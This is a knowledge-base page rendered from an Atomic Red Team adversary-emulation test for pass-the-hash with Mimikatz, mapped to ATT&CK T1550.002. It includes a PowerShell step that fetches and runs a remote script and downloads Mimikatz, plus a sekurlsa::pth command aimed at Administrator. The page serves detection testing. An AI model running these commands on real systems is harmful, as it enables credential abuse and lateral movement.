---
atomic_guid: "ec23cef9-27d9-46e4-a68d-6f75f7b86908"
title: "Mimikatz Pass the Hash"
framework: "atomic"
generated: "true"
attack_technique_id: "T1550.002"
attack_technique_name: "Use Alternate Authentication Material: Pass the Hash"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.002/T1550.002.yaml"
build_date: "2026-04-27 19:12:28"
executor: "command_prompt"
aliases:
  - "ec23cef9-27d9-46e4-a68d-6f75f7b86908"
  - "Mimikatz Pass the Hash"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Note: must dump hashes first
[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)

## ATT&CK Mapping

- [[kb/attack/techniques/T1550-use_alternate_authentication_material#^t1550002-pass-the-hash|T1550.002: Pass the Hash]]

## Input Arguments

### domain

- description: domain
- type: string
- default: %userdnsdomain%

### mimikatz_path

- description: mimikatz windows executable
- type: path
- default: %tmp%\mimikatz\x64\mimikatz.exe

### ntlm

- description: ntlm hash
- type: string
- default: cc36cf7a8514893efccd3324464tkg1a

### user_name

- description: username
- type: string
- default: Administrator

## Dependencies

Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})

### Prerequisite Check

```powershell
$mimikatz_path = cmd /c echo #{mimikatz_path}
if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
$releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
$mimikatz_exe = cmd /c echo #{mimikatz_path}
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
```

## Executor

- name: command_prompt

### Command

```cmd
#{mimikatz_path} "sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.002/T1550.002.yaml)
